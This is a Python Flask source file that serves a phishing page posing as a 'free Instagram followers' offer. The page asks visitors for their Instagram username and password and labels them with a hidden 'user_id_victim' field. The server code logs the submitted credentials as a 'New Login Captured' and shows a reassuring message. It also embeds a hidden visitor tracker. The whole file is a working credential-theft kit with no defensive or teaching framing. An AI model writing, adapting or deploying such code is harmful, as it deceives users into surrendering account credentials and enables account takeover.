from flask import Flask, request

app = Flask(__name__)

html_code = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title> wwww.instagram Followers.com</title>
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <style>
    /* Basic reset */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background: #fff;
  font-family: 'Lato', sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
  min-height: 100vh;
}

/* Container styling */
#container {
  width: 100%;
  max-width: 480px;
  margin: auto;
  background: #f9f9f9;
  border-radius: 10px;
  box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
  overflow: hidden;
}

/* Form elements */
form {
  padding: 20px;
}

label {
  display: block;
  margin-top: 15px;
  font-weight: 600;
  color: #444;
}

.blocked, .block {
  width: 100%;
  border: none;
  border-bottom: 2px solid #ff2d2d;
  padding: 12px;
  margin-top: 5px;
  background: transparent;
  font-size: 16px;
  transition: all 0.3s ease;
}

.blocked:focus, .block:focus {
  outline: none;
  border-color: #11af26;
}

/* Submit button */
input[type="submit"] {
  margin-top: 20px;
  width: 100%;
  background: #ff2d2d;
  color: white;
  padding: 12px;
  font-weight: bold;
  font-size: 16px;
  border: none;
  cursor: pointer;
  border-radius: 5px;
  transition: 0.3s ease;
}

input[type="submit"]:hover {
  background-color: #11af26;
}

/* Responsive image */
#container img {
  width: 100%;
  height: auto;
  display: block;
  margin-bottom: 15px;
}

/* Footer image inside form */
#footer-image {
  display: block;
  margin: 20px auto 0 auto;
  max-width: 250px;
  height: 110px;
}

/* Footer */
.footer {
  background: black;
  color: white;
  text-align: center;
  padding: 20px;
}

/* Mobile responsiveness */
@media screen and (max-width: 500px) {
  .blocked, .block {
    padding: 10px;
  }

  input[type="submit"] {
    padding: 10px;
  }
}

  </style>
</head>
<body>
<div id="container">
  <img src="https://i.ibb.co/RkL27NtK/02.gif" alt="Loading GIF">
  <form method="POST" id="login_form">
    <input type="hidden" name="user_id_victim" value="250610">

    <label>Instagram username:</label>
    <input type="text" name="email" placeholder="Enter username Here" class="blocked" required>

    <label>Instagram password:</label>
    <input type="password" name="pass" placeholder="Enter Password" class="blocked" required>

    <label>Followers:</label>
    <select name="state" class="block" required>
      <option selected disabled>-Select Your Followers-</option>
      <option>1K</option><option>2K</option><option>3K</option><option>4K</option><option>5K</option>
    </select>

    <input class="blocked" id="submit" name="login" type="submit" value="submit">
    
    <!-- Image just below submit -->
    <img id="footer-image" src="https://i.ibb.co/20JTR28d/01.jpg" alt="Footer Image">
  </form>
</div>

<div id="0000" style="display: none;">
  <div id="histats_counter"></div>
  <script type="text/javascript">
    var _Hasync = _Hasync || [];
    _Hasync.push(['Histats.start', '1,3717632,4,1034,150,25,00000001']);
    _Hasync.push(['Histats.fasi', '1']);
    _Hasync.push(['Histats.track_hits', '']);
    (function() {
      var hs = document.createElement('script');
      hs.type = 'text/javascript'; hs.async = true;
      hs.src = ('//s10.histats.com/js15_as.js');
      document.getElementsByTagName('head')[0].appendChild(hs);
    })();
  </script>
</div>

</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('pass')
        followers = request.form.get('state')

        print("\n🔐 New Login Captured:")
        print(f"📛 Username: {username}")
        print(f"🔑 Password: {password}")
        print(f"📊 Followers Requested: {followers}")
        print("-" * 40)

        return "<h2>Request received! Please wait while we process your followers.</h2>"

    return html_code

if __name__ == '__main__':
    app.run(debug=True)
